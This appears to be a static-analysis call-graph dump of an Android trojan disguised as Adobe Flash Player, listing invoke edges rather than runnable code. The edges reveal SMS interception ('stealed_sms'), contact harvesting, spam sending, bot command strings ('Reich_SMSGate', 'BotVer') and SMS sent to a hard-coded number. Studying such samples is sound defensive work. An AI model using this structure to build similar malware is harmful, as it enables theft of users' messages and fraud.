VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r9, r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "getMessages:SMSGATE", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_SMSGate", r8, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getProcesses:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("ua") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r15 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <android.app.Service: void onCreate()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r14, $r6, $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>("+79037676840", r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: interfaceinvoke r5.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r44, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.TreeMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $r15 = staticinvoke <android.util.Base64: byte[] decode(java.lang.String,int)>(r8, 0) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.util.Base64: byte[] decode(java.lang.String,int)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<android.app.Service: void onCreate()>() in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <android.app.Service: void onCreate()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("sdcard/") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeFlashCore: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: android.content.Intent getIntent()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashW: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: android.content.Intent getIntent()>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotVer", "5.3") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer.Certificate: void <init>()>() in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "loadSpam:Executed", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r4 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.io.FileOutputStream openFileOutput(java.lang.String,int)>($r1, 0) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileOutputStream openFileOutput(java.lang.String,int)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r32.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r8 = virtualinvoke r8.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r2.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.StringBuffer: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getContacts:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "sentSpam[OK]:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: void onDestroy()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("getMessages") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r13, "android_id") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_sms&i=sms") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: android.content.Intent getIntent()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "out", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":SMSGATE") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String format(java.lang.String,java.lang.Object[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void <init>()> ==> <android.app.Service: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)>
SPECIAL edge: $r4 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
